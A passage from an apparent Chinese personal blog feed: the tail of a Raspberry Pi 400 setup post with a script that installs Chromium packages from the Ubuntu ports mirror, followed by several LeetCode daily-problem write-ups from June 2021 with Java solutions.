2defaults.pcm.card 2defaults.timer.card 2 软件配置开机初始化完成系统之后，如果你选择的语言是中文，那么需要安装一下完整的语言支持包，否则界面大部分还是英文的，也没有中文输入法 安装完整的中文语言支持包打开设置-&gt;个人偏好-&gt;语言支持，安装，会同时安装好中文输入法，切换的快捷键是ctrl + space（空格） 安装必备的软件请注意树梅派系列的产品cpu架构是arm的（树梅派400是arm64），因此需要安装对应架构的软件才能跑 浏览器，系统自带的firefox浏览器我认为不好用，我更喜欢chrome，但是巧的是chrome没有编译好的arm版本可供下载，这时候有两种选择，一是自己下载源代码配置好相关环境之后编译安装，二是安装ubantu源里面的chromium，这里我选择二，给出一个安装脚本,首先访问：http://ports.ubuntu.com/pool/universe/c/chromium-browser/ 确定一下当前最新的版本是多少，然后把版本填到下面的脚本的第一行，把它保存为一个文件，赋予执行权限，执行即可 12345678910111213141516171819version=91.0.4472.101sudo apt autoremove snapd#echo $versionwget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debwget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.deb# 支持播放B站视频wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb sudo dpkg -i chromium-browser_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debsudo dpkg -i chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.debsudo dpkg -i chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.debrm chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb rm chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb rm chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.debrm chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.debrm chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.deb （未完待续）]]></content>
      <categories>
        <category>树梅派</category>
      </categories>
      <tags>
        <tag>树梅派400</tag>
        <tag>使用指南</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/17]]></title>
    <url>%2Fposts%2Fd89a603f%2F</url>
    <content type="text"><![CDATA[题目：65. 有效数字难度：困难 有效数字（按顺序）可以分成以下几个部分： 一个 小数 或者 整数 （可选）一个 ‘e’ 或 ‘E’ ，后面跟着一个 整数 小数（按顺序）可以分成以下几个部分： （可选）一个符号字符（’+’ 或 ‘-‘） 下述格式之一： 至少一位数字，后面跟着一个点 '.' 至少一位数字，后面跟着一个点 '.' ，后面再跟着至少一位数字 一个点 '.' ，后面跟着至少一位数字 整数（按顺序）可以分成以下几个部分： （可选）一个符号字符（’+’ 或 ‘-‘） 至少一位数字 部分有效数字列举如下： [“2”, “0089”, “-0.1”, “+3.14”, “4.”, “-.9”, “2e10”, “-90E3”, “3e+7”, “+6e-1”, “53.5e93”, “-123.456e789”] 部分无效数字列举如下： [“abc”, “1a”, “1e”, “e3”, “99e2.5”, “–6”, “-+3”, “95a54e53”] 给你一个字符串 s ，如果 s 是一个 有效数字 ，请返回 true 。 示例 1： 12输入：s = &quot;0&quot;输出：true 示例 2： 12输入：s = &quot;e&quot;输出：false 示例 3： 12输入：s = &quot;.&quot;输出：false 示例 4： 12输入：s = &quot;.1&quot;输出：true 提示： 1 &lt;= s.length &lt;= 20 s 仅含英文字母（大写和小写），数字（0-9），加号 ‘+’ ，减号 ‘-‘ ，或者点 ‘.’ 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/valid-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接上正则表达式 解题代码12345class Solution &#123; public boolean isNumber(String s) &#123; return s.matches("^\\s*[+-]?((\\d*\\.\\d+)|\\d+\\.?)([eE][+-]?\\d+)?\\s*"); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/16]]></title>
    <url>%2Fposts%2Faf9d50a9%2F</url>
    <content type="text"><![CDATA[题目：877. 石子游戏难度：中等 亚历克斯和李用几堆石子在做游戏。偶数堆石子排成一行，每堆都有正整数颗石子 piles[i] 。 游戏以谁手中的石子最多来决出胜负。石子的总数是奇数，所以没有平局。 亚历克斯和李轮流进行，亚历克斯先开始。 每回合，玩家从行的开始或结束处取走整堆石头。 这种情况一直持续到没有更多的石子堆为止，此时手中石子最多的玩家获胜。 假设亚历克斯和李都发挥出最佳水平，当亚历克斯赢得比赛时返回 true ，当李赢得比赛时返回 false 。 示例： 12345678输入：[5,3,4,5]输出：true解释：亚历克斯先开始，只能拿前 5 颗或后 5 颗石子 。假设他取了前 5 颗，这一行就变成了 [3,4,5] 。如果李拿走前 3 颗，那么剩下的是 [4,5]，亚历克斯拿走后 5 颗赢得 10 分。如果李拿走后 5 颗，那么剩下的是 [3,4]，亚历克斯拿走后 4 颗赢得 9 分。这表明，取前 5 颗石子对亚历克斯来说是一个胜利的举动，所以我们返回 true 。 提示： 2 &lt;= piles.length &lt;= 500 piles.length 是偶数。 1 &lt;= piles[i] &lt;= 500 sum(piles) 是奇数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/stone-game/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先手通吃 解题代码12345class Solution &#123; public boolean stoneGame(int[] piles) &#123; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/15]]></title>
    <url>%2Fposts%2F36940113%2F</url>
    <content type="text"><![CDATA[题目：852. 山脉数组的峰顶索引难度：简单 符合下列属性的数组 arr 称为 山脉数组 ： arr.length &gt;= 3 存在 i（0 &lt; i &lt; arr.length - 1）使得： arr[0] < arr[1] < ... arr[i-1] < arr[i] arr[i] > arr[i+1] > ... > arr[arr.length - 1] 给你由整数组成的山脉数组 arr ，返回任何满足 arr[0] &lt; arr[1] &lt; … arr[i - 1] &lt; arr[i] &gt; arr[i + 1] &gt; … &gt; arr[arr.length - 1] 的下标 i 。 示例 1： 12输入：arr = [0,1,0]输出：1 示例 2： 12输入：arr = [0,2,1,0]输出：1 示例 3： 12输入：arr = [0,10,5,2]输出：1 示例 4： 12输入：arr = [3,4,5,1]输出：2 示例 5： 12输入：arr = [24,69,100,99,79,78,67,36,26,19]输出：2 提示： 3 &lt;= arr.length &lt;= 104 0 &lt;= arr[i] &lt;= 106 题目数据保证 arr 是一个山脉数组 进阶： 很容易想到时间复杂度 O(n) 的解决方案，你可以设计一个 O(log(n)) 的解决方案吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/peak-index-in-a-mountain-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分查找到第一个比左边和右边都大的元素位置即可 解题代码12345678910111213141516171819class Solution &#123; public int peakIndexInMountainArray(int[] arr) &#123; int ans = 0; int l = 0; int r = arr.length; while (l &lt; r) &#123; int m = l + (r - l) / 2; if (arr[m] &gt; arr[m - 1] &amp;&amp; arr[m] &gt; arr[m + 1]) &#123; ans = m; break; &#125; else if (arr[m] &lt; arr[m - 1]) &#123; r = m; &#125; else &#123; l = m; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/14]]></title>
    <url>%2Fposts%2F41933185%2F</url>
    <content type="text"><![CDATA[题目：374. 猜数字大小难度：简单 猜数字游戏的规则如下： 每轮游戏，我都会从 1 到 n 随机选择一个数字。 请你猜选出的是哪个数字。 如果你猜错了，我会告诉你，你猜测的数字比我选出的数字是大了还是小了。 你可以通过调用一个预先定义好的接口 int guess(int num) 来获取猜测结果，返回值一共有 3 种可能的情况（-1，1 或 0）： -1：我选出的数字比你猜的数字小 pick &lt; num 1：我选出的数字比你猜的数字大 pick &gt; num 0：我选出的数字和你猜的数字一样。恭喜！你猜对了！pick == num 返回我选出的数字。 示例 1： 12输入：n = 10, pick = 6输出：6 示例 2： 12输入：n = 1, pick = 1输出：1 示例 3： 12输入：n = 2, pick = 1输出：1 示例 4： 12输入：n = 2, pick = 2输出：2 提示： 1 &lt;= n &lt;= 231 - 1 1 &lt;= pick &lt;= n 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/guess-number-higher-or-lower/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 还是二分查找 解题代码123456789101112131415161718192021222324252627/** * Forward declaration of guess API. * @param num your guess * @return -1 if num is lower than the guess number * 1 if num is higher than the guess number * otherwise return 0 * int guess(int num); */public class Solution extends GuessGame &#123; public int guessNumber(int n) &#123; int l = 1; int r = n; while (l &lt; r) &#123; int m = l + (r - l) / 2; int q = guess(m); if (q == 0) &#123; return m; &#125; else if (q == -1) &#123; r = m; &#125; else &#123; l = m + 1; &#125; &#125; return l; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/13]]></title>
    <url>%2Fposts%2Fdff7a426%2F</url>
    <content type="text"><![CDATA[题目：278. 第一个错误的版本难度：简单 你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。 假设你有 n 个版本 [1, 2, …, n]，你想找出导致之后所有版本出错的第一个错误的版本。 你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。 示例: 1234567给定 n = 5，并且 version = 4 是第一个错误的版本。调用 isBadVersion(3) -&gt; false调用 isBadVersion(5) -&gt; true调用 isBadVersion(4) -&gt; true所以，4 是第一个错误的版本。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/first-bad-version/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分查找，注意一下m可能会溢出 解题代码12345678910111213141516171819/* The isBadVersion API is defined in the parent class VersionControl. boolean isBadVersion(int version); */public class Solution extends VersionControl &#123; public int firstBadVersion(int n) &#123; int l = 1; int r = n; while (l &lt; r) &#123; int m = l + (r - l) / 2; boolean q = isBadVersion(m); if (q) &#123; r = m; &#125; else &#123; l = m + 1; &#125; &#125; return l; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/11]]></title>
    <url>%2Fposts%2F31f9c50a%2F</url>
    <content type="text"><![CDATA[题目：279. 完全平方数难度：中等 给定正整数 n，找到若干个完全平方数（比如 1, 4, 9, 16, …）使得它们的和等于 n。你需要让组成和的完全平方数的个数最少。 给你一个整数 n ，返回和为 n 的完全平方数的 最少数量 。 完全平方数 是一个整数，其值等于另一个整数的平方；换句话说，其值等于一个整数自乘的积。例如，1、4、9 和 16 都是完全平方数，而 3 和 11 不是。 示例 1： 123输入：n = 12输出：3 解释：12 = 4 + 4 + 4 示例 2： 123输入：n = 13输出：2解释：13 = 4 + 9 提示： 1 &lt;= n &lt;= 104 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/perfect-squares/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int numSquares(int n) &#123; List&lt;Integer&gt; nums = new ArrayList&lt;&gt;(); for (int i = 1;i * i &lt;= n;i++) &#123; nums.add(i * i); &#125; Collections.reverse(nums); dfs(nums,n,0); return ans; &#125; int ans = Integer.MAX_VALUE; public void dfs(List&lt;Integer&gt; nums,int n,int k) &#123; if (n &lt;= 0) &#123; if (n == 0) &#123; ans = Math.min(ans,k); &#125; return; &#125; for (int i = 0;i &lt; nums.size();i++) &#123; if (n &gt;= nums.get(i) &amp;&amp; k &lt; ans) &#123; int t = n / nums.get(i); dfs(nums,n - t * nums.get(i),k + t); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/10]]></title>
    <url>%2Fposts%2F46fef59c%2F</url>
    <content type="text"><![CDATA[题目：518. 零钱兑换 II难度：中等 给定不同面额的硬币和一个总金额。写出函数来计算可以凑成总金额的硬币组合数。假设每一种面额的硬币有无限个。 示例 1: 1234567输入: amount = 5, coins = [1, 2, 5]输出: 4解释: 有四种方式可以凑成总金额:5=55=2+2+15=2+1+1+15=1+1+1+1+1 示例 2: 123输入: amount = 3, coins = [2]输出: 0解释: 只用面额2的硬币不能凑成总金额3。 示例 3: 12输入: amount = 10, coins = [10] 输出: 1 注意: 你可以假设： 0 &lt;= amount (总金额) &lt;= 5000 1 &lt;= coin (硬币面额) &lt;= 5000 硬币种类不超过 500 种 结果符合 32 位符号整数 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/coin-change-2/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 记忆化搜索好想 不到万不得已 绝不写动态规划 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int change(int amount, int[] coins) &#123; Arrays.sort(coins); return dfs(coins,coins.length - 1,amount); &#125; Map&lt;String,Integer&gt; ms = new HashMap&lt;&gt;(); public int dfs(int[] coins,int c,int t) &#123; if (t &lt;= 0) &#123; if (t == 0) &#123; return 1; &#125; return 0; &#125; String k = c + "," + t; if (ms.get(k) != null) &#123; return ms.get(k); &#125; int a = 0; for (int i = c;i &gt;= 0;i--) &#123; if (t &gt;= coins[i]) a += dfs(coins,i,t - coins[i]); &#125; ms.put(k,a); return a; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/7]]></title>
    <url>%2Fposts%2F7142308c%2F</url>
    <content type="text"><![CDATA[题目：494. 目标和难度：中等 给你一个整数数组 nums 和一个整数 target 。 向数组中的每个整数前添加 ‘+’ 或 ‘-‘ ，然后串联起所有整数，可以构造一个 表达式 ： 例如，nums = [2, 1] ，可以在 2 之前添加 ‘+’ ，在 1 之前添加 ‘-‘ ，然后串联起来得到表达式 “+2-1” 。 返回可以通过上述方法构造的、运算结果等于 target 的不同 表达式 的数目。 示例 1： 12345678输入：nums = [1,1,1,1,1], target = 3输出：5解释：一共有 5 种方法让最终目标和为 3 。-1 + 1 + 1 + 1 + 1 = 3+1 - 1 + 1 + 1 + 1 = 3+1 + 1 - 1 + 1 + 1 = 3+1 + 1 + 1 - 1 + 1 = 3+1 + 1 + 1 + 1 - 1 = 3 示例 2： 12输入：nums = [1], target = 1输出：1 提示： 1 &lt;= nums.length &lt;= 20 0 &lt;= nums[i] &lt;= 1000 0 &lt;= sum(nums[i]) &lt;= 1000 -1000 &lt;= target &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/target-sum/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 比较明显 直接搜索即可 为了提高效率 采用记忆化搜索的方式 解题代码123456789101112131415161718192021222324class Solution &#123; public int findTargetSumWays(int[] nums, int target) &#123; return dfs(nums,0,0,target); &#125; Map&lt;String,Integer&gt; ms = new HashMap&lt;&gt;(); private int dfs(int[] nums,int c,int s,int t) &#123; if (c &gt;= nums.length) &#123; if (s == t) &#123; return 1; &#125; return 0; &#125; String k = (c) + "," + (s); if (ms.get(k) != null) &#123; return ms.get(k); &#125; int a = dfs(nums,c + 1,s + nums[c],t); int b = dfs(nums,c + 1,s - nums[c],t); ms.put(k,a + b); return ms.get(k); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/5]]></title>
    <url>%2Fposts%2F9f4c51a0%2F</url>
    <content type="text"><![CDATA[题目：203. 移除链表元素难度：简单 head val Node.val == val 新的头节点 示例 1： 12输入：head = [1,2,6,3,4,5,6], val = 6输出：[1,2,3,4,5] 示例 2： 12输入：head = [], val = 1输出：[] 示例 3： 12输入：head = [7,7,7,7], val = 7输出：[] 提示： 列表中的节点在范围 [0, 104] 内 1 &lt;= Node.val &lt;= 50 0 &lt;= k &lt;= 50 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-linked-list-elements/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 常规操作 解题代码123456789101112131415161718192021222324252627282930313233/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode removeElements(ListNode head, int val) &#123; ListNode vHead = new ListNode(-1,head); ListNode pre = vHead; ListNode cur = vHead; while (cur != null) &#123; boolean flag = false; while (cur != null &amp;&amp; cur.val == val) &#123; cur = cur.next; flag = true; &#125; if (flag) &#123; pre.next = cur; &#125; if (cur == null) &#123; break; &#125; pre = cur; cur = cur.next; &#125; return vHead.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/4]]></title>
    <url>%2Fposts%2Fe84b6136%2F</url>
    <content type="text"><![CDATA[题目：160. 相交链表难度：简单 给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。 图示两个链表在节点 c1 开始相交： 题目数据 保证 整个链式结构中不存在环。 注意，函数返回结果后，链表必须 保持其原始结构 。 示例 1： 12345输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3输出：Intersected at &apos;8&apos;解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 12345输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1输出：Intersected at &apos;2&apos;解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 12345输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2输出：null解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。这两个链表不相交，因此返回 null 。 提示： listA 中节点数目为 m listB 中节点数目为 n 0 &lt;= m, n &lt;= 3 * 104 1 &lt;= Node.val &lt;= 105 0 &lt;= skipA &lt;= m 0 &lt;= skipB &lt;= n 如果 listA 和 listB 没有交点，intersectVal 为 0 如果 listA 和 listB 有交点，intersectVal == listA[skipA + 1] == listB[skipB + 1] 进阶：你能否设计一个时间复杂度 O(n) 、仅用 O(1) 内存的解决方案？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/intersection-of-two-linked-lists/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 经典双指针法判断两个链表是否相交 解题代码12345678910111213141516171819202122232425/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; if (headA == null || headB == null) &#123; return null; &#125; ListNode cA = headA; ListNode cB = headB; while (cA != cB) &#123; cA = cA == null ? headB : cA.next; cB = cB == null ? headA : cB.next; &#125; return cA; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/3]]></title>
    <url>%2Fposts%2F762ff495%2F</url>
    <content type="text"><![CDATA[题目：525. 连续数组难度：中等 给定一个二进制数组 nums , 找到含有相同数量的 0 和 1 的最长连续子数组，并返回该子数组的长度。 示例 1: 123输入: nums = [0,1]输出: 2说明: [0, 1] 是具有相同数量0和1的最长连续子数组。 示例 2: 123输入: nums = [0,1,0]输出: 2说明: [0, 1] (或 [1, 0]) 是具有相同数量0和1的最长连续子数组。 提示： 1 &lt;= nums.length &lt;= 105 nums[i] 不是 0 就是 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/contiguous-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 跟昨天一样 解题代码123456789101112131415161718192021class Solution &#123; public int findMaxLength(int[] nums) &#123; int ans = 0; int c = 0; Map&lt;Integer,Integer&gt; m = new HashMap&lt;&gt;(); m.put(0,-1); for (int i = 0;i &lt; nums.length;i++) &#123; if (nums[i] == 1) &#123; c--; &#125; else &#123; c++; &#125; if (m.containsKey(c)) &#123; ans = Math.max(ans,i - m.get(c)); &#125; else &#123; m.put(c,i); &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/2]]></title>
    <url>%2Fposts%2F128c403%2F</url>
    <content type="text"><![CDATA[题目：523. 连续的子数组和难度：中等 给你一个整数数组 nums 和一个整数 k ，编写一个函数来判断该数组是否含有同时满足下述条件的连续子数组： 子数组大小 至少为 2 ，且 子数组元素总和为 k 的倍数。 如果存在，返回 true ；否则，返回 false 。 如果存在一个整数 n ，令整数 x 符合 x = n * k ，则称 x 是 k 的一个倍数。 示例 1： 123输入：nums = [23,2,4,6,7], k = 6输出：true解释：[2,4] 是一个大小为 2 的子数组，并且和为 6 。 示例 2： 1234输入：nums = [23,2,6,4,7], k = 6输出：true解释：[23, 2, 6, 4, 7] 是大小为 5 的子数组，并且和为 42 。 42 是 6 的倍数，因为 42 = 7 * 6 且 7 是一个整数。 示例 3： 12输入：nums = [23,2,6,4,7], k = 13输出：false 提示： 1 &lt;= nums.length &lt;= 105 0 &lt;= nums[i] &lt;= 109 0 &lt;= sum(nums[i]) &lt;= 231 - 1 1 &lt;= k &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/continuous-subarray-sum/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 开始用前缀和优化 超时，然后用同余，AC 解题代码前缀和，在第93个测试用例超时 12345678910111213141516171819202122class Solution &#123; public boolean checkSubarraySum(int[] nums, int k) &#123; int n = nums.length; int[] sum = new int[n]; sum[0] = nums[0]; for (int i = 1;i &lt; n;i++) &#123; sum[i] = sum[i - 1] + nums[i]; if (sum[i] % k == 0) &#123; return true; &#125; &#125; for (int i = 1;i &lt; n;i++) &#123; for (int j = 0;i - j &gt;= 2;j++) &#123; if ((sum[i] - sum[j]) % k == 0) &#123; return true; &#125; &#125; &#125; return false; &#125;&#125; 同余，AC 12345678910111213141516171819class Solution &#123; public boolean checkSubarraySum(int[] nums, int k) &#123; Map&lt;Integer,Integer&gt; m = new HashMap&lt;&gt;(); int r = 0; m.put(0,-1); for (int i = 0;i &lt; nums.length;i++) &#123; r = (r + nums[i]) % k; if (m.containsKey(r)) &#123; int index = m.get(r); if (i - index &gt;= 2) &#123; return true; &#125; &#125; else &#123; m.put(r,i); &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/1]]></title>
    <url>%2Fposts%2F982195b9%2F</url>
    <content type="text"><![CDATA[题目：1744. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？难度：中等 给你一个下标从 0 开始的正整数数组 candiesCount ，其中 candiesCount[i] 表示你拥有的第 i 类糖果的数目。同时给你一个二维数组 queries ，其中 queries[i] = [favoriteTypei, favoriteDayi, dailyCapi] 。 你按照如下规则进行一场游戏： 你从第 0 天开始吃糖果。 你在吃完 所有 第 i - 1 类糖果之前，不能 吃任何一颗第 i 类糖果。 在吃完所有糖果之前，你必须每天 至少 吃 一颗 糖果。 请你构建一个布尔型数组 answer ，满足 answer.length == queries.length 。answer[i] 为 true 的条件是：在每天吃 不超过 dailyCapi 颗糖果的前提下，你可以在第 favoriteDayi 天吃到第 favoriteTypei 类糖果；否则 answer[i] 为 false 。注意，只要满足上面 3 条规则中的第二条规则，你就可以在同一天吃不同类型的糖果。 请你返回得到的数组 answer 。 示例 1： 123456输入：candiesCount = [7,4,5,3,8], queries = [[0,2,2],[4,2,4],[2,13,1000000000]]输出：[true,false,true]提示：1- 在第 0 天吃 2 颗糖果(类型 0），第 1 天吃 2 颗糖果（类型 0），第 2 天你可以吃到类型 0 的糖果。2- 每天你最多吃 4 颗糖果。即使第 0 天吃 4 颗糖果（类型 0），第 1 天吃 4 颗糖果（类型 0 和类型 1），你也没办法在第 2 天吃到类型 4 的糖果。换言之，你没法在每天吃 4 颗糖果的限制下在第 2 天吃到第 4 类糖果。3- 如果你每天吃 1 颗糖果，你可以在第 13 天吃到类型 2 的糖果。 示例 2： 12输入：candiesCount = [5,2,6,4,1], queries = [[3,1,2],[4,10,3],[3,10,100],[4,100,30],[1,3,1]]输出：[false,true,true,false,false] 提示： 1 &lt;= candiesCount.length &lt;= 105 1 &lt;= candiesCount[i] &lt;= 105 1 &lt;= queries.length &lt;= 105 queries[i].length == 3 0 &lt;= favoriteTypei &lt; candiesCount.length 0 &lt;= favoriteDayi &lt;= 109 1 &lt;= dailyCapi &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 儿童节躺平 抄 解题代码1234567891011121314151617181920class Solution &#123; public boolean[] canEat(int[] candiesCount, int[][] queries) &#123; int n = queries.length; int m = candiesCount.length; boolean[] ans = new boolean[n]; long[] sum = new long[m + 1]; for (int i = 1;i &lt;= m;i++) &#123; sum[i] = sum[i - 1] + candiesCount[i - 1]; &#125; for (int i = 0;i &lt; n;i++) &#123; int t = queries[i][0]; int d = queries[i][1] + 1; int c = queries[i][2]; long a = sum[t] / c + 1; long b = sum[t + 1]; ans[i] = a &lt;= d &amp;&amp; d &lt;= b; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/31]]></title>
    <url>%2Fposts%2F117a0866%2F</url>
